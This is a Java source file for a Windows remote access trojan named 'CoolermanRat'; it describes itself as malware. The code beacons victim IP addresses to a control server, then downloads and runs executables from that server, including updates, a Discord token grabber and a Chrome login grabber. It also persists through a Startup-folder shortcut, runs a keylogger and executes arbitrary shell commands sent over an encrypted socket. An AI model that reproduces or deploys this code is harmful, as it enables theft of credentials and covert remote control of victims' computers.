package me.dodeedoo.CoolermanRat;

import mslinks.ShellLink;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class Main {

    public static String version = "1.0";
    public static String uuid;
    public static String ip;
    public static String ipv6;
    public static Boolean debug = false;
    public static KeyLogger keyLogger = new KeyLogger();
    public static String userdir = System.getProperty("user.home");
    private static List<String> versions = new ArrayList<>();

    public static void downloadFile(URL url, String outputFileName) throws IOException {
        File file = new File(outputFileName);
        file.getParentFile().mkdir();
        try (InputStream in = url.openStream();
             ReadableByteChannel rbc = Channels.newChannel(in);
             FileOutputStream fos = new FileOutputStream(outputFileName)) {
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
        }

    }

    public static String versionCheck(String url) throws IOException {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", "Mozilla/5.0");
        int responseCode = con.getResponseCode();
        System.out.println("\nGetting version : " + url);
        //System.out.println("Response Code : " + responseCode);
        if (responseCode != 200) {
            System.out.println("error occured while getting version...");
            return version;
        }
        BufferedReader in = new BufferedReader(
                new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();
        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();
        return response.toString();
    }


    public static void main(String[] args) throws Exception {

        //Only windows malware, for now
        if (!System.getProperty("os.name").contains("Windows")) {
            System.exit(1);
        }

        /*
        JFrame frame1 = new JFrame();
        frame1.add(new JLabel("ERROR"), BorderLayout.NORTH);
        JLabel label1 = new JLabel("Severe Error");
        label1.setText("Your version of Windows is not compatible with this application!");
        frame1.add(label1);
        frame1.pack();
        frame1.setVisible(true);
        frame1.setSize(90, 70);


        if (!debug) {
            if (new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath().contains("Minecraft")) {
                downloadFile(new URL("http://a6tj7d.xyz/ul/main/dl"), userdir + "/din32/din32.exe");
                Runtime.getRuntime().exec(userdir + "\\din32\\din32.exe", null, new File(userdir + "\\din32\\"));
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "ping", "localhost", "-n", "10", ">", "nul", "&&", "del", "Minecraft.exe"});
                System.exit(1);
            }
        }
        */



        //Register UUID / set new UUID
        File uuidfile = new File(userdir + "/din32key.txt");
        if (!uuidfile.exists()) {
            uuidfile.createNewFile();
            FileWriter writer = new FileWriter(userdir + "/din32key.txt");
            uuid = UUID.randomUUID().toString();
            writer.write(uuid);
            writer.close();
        }else{
            BufferedReader reader = new BufferedReader(new FileReader(userdir + "/din32key.txt"));
            uuid = reader.readLine();
        }

        //Grab ipv4
        try(final DatagramSocket socket = new DatagramSocket()){
            socket.connect(InetAddress.getByName("8.8.8.8"), 10002);
            ip = socket.getLocalAddress().getHostAddress();
        }catch (Exception e) {
            System.exit(3);
        }

        //Grab ipv6
        ipv6 = new CMDManager(new String[]{"cmd", "/c", "ipconfig"}, "IPv6").getResponse(false).get(1).replace("IPv6 Address. . . . . . . . . . . : ", "").replace(" ", "");

        //Version checker / updater
        if (!version.equals(versionCheck("http://a6tj7d.xyz/ul/main/ver").replace("\"", "").replace("}", "").replace("{", "").replace(":", "").replace("version", ""))) {
            System.out.println(versionCheck("http://a6tj7d.xyz/ul/main/ver").replace("\"", "").replace("}", "").replace("{", "").replace(":", "").replace("version", ""));
            downloadFile(new URL("http://a6tj7d.xyz/ul/main/dl"), userdir + "/din32/cache/din32.exe");
            Runtime.getRuntime().exec(userdir + "\\din32\\cache\\din32.exe", null, new File(userdir + "\\din32\\cache\\"));
            System.exit(2);
        }

        //Debug Window
        if (debug) {
            JFrame frame = new JFrame();
            frame.add(new JLabel("Console Log"), BorderLayout.NORTH);
            JTextArea ta = new JTextArea();
            TextAreaOutputStream taos = new TextAreaOutputStream(ta, 60);
            PrintStream ps = new PrintStream(taos);
            System.setOut(ps);
            System.setErr(ps);
            frame.add(new JScrollPane(ta));
            frame.pack();
            frame.setVisible(true);
            frame.setSize(800, 600);
            //frame.setIconImage(ImageIO.read(new URL("https://dodeedoo.me/server-icon.png")));
        }

        //new CMDManager(new String[]{"cmd", "/c", "ver"}, "");
        //new CMDManager(new String[]{"cmd", "/c", "arp", "-a"}, "");

        //Prototype Keylogger
        keyLogger.init();

        //Add to startup
        downloadFile(new URL("http://a6tj7d.xyz/ul/main/dl"), userdir + "/din32/din32.exe");
        System.out.println(new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath());
        System.out.println("eee");
        try {
            ShellLink.createLink(userdir + "/din32/din32.exe", userdir + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runtimestartup.lnk");
        }catch (IOException e) {
            e.printStackTrace();
        }

        //Download discord grabber and chrome grabber
        downloadFile(new URL("http://a6tj7d.xyz/ul/tokengrabber/dl"), userdir + "/din32/din32util.exe"); //discord grabber
        Runtime.getRuntime().exec(userdir + "\\din32\\din32util.exe", null, new File(userdir + "\\din32\\"));
        downloadFile(new URL("http://a6tj7d.xyz/ul/logingrabber/dl"), userdir + "/din32/dinlib.exe"); //chrome grabber
        Runtime.getRuntime().exec(userdir + "\\din32\\dinlib.exe", null, new File(userdir + "\\din32\\"));

        //Open Socket
        ServerSocket serverSocket = new ServerSocket();
        serverSocket.bind(new InetSocketAddress(ip, 12435));
        System.out.println("hosting..." + serverSocket);

        //Listen for commands
        while (true) {
            try {
                new Requests("http://a6tj7d.xyz/sendupdate", "{\"uuid\":\"" + uuid + "\",\"ip\":\"" + ip + "\",\"ipv6\":\"" + ipv6 + "\"}").execute();
                Socket clientSocket = serverSocket.accept();
                System.out.println("connection found");
                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                String inputLine;
                System.out.println("variable defining success");
                out.println("connection accepted");
                while ((inputLine = AES.decrypt(in.readLine(), ")H@MbQeThWmZq4t7w!z%C*F-JaNdRfUj")) != null) {
                    System.out.println(inputLine);
                    if (inputLine.equals("kill")) {
                        System.exit(1);
                    }
                    if (inputLine.equals("forceupdate")) {
                        downloadFile(new URL("http://a6tj7d.xyz/ul/main/dl"), userdir + "/din32/cache/din32.exe");
                        Runtime.getRuntime().exec(userdir + "\\din32\\cache\\din32.exe", null, new File(userdir + "\\din32\\cache\\"));
                        out.println("Force updating bot # " + uuid);
                        System.exit(2);
                    }
                    if (inputLine.contains("cmd")) {
                        inputLine = inputLine.replace("cmd ", "");
                        //List<String> tmpcommands = new ArrayList<>();
                        //int i;
                        //for (i = 0; i <= (inputLine.split(" ").length - 1); i++) {
                        //    tmpcommands.add(inputLine.split(" ")[i]);
                        //}
                        String[] splitted = inputLine.split(" ");
                        if (splitted.length != 1) {
                            if (splitted.length == 2) new CMDManager(new String[]{"cmd", "/c", splitted[0], splitted[1]}, "");
                            else if (splitted.length == 3) new CMDManager(new String[]{"cmd", "/c", splitted[0], splitted[1],splitted[2]}, "");
                            else if (splitted.length == 4) new CMDManager(new String[]{"cmd", "/c", splitted[0], splitted[1],splitted[2], splitted[3]}, "");
                            else new CMDManager(new String[]{"cmd", "/c", splitted[0], splitted[1],splitted[2], splitted[3],splitted[4]}, "");
                            break;
                        }
                        new CMDManager(new String[]{"cmd", "/c", inputLine}, "");
                        break;
                    }
                }
            }catch (Exception e) {
                e.printStackTrace();
                System.out.println("no more input, going back to standby");
            }
        }
    }
}
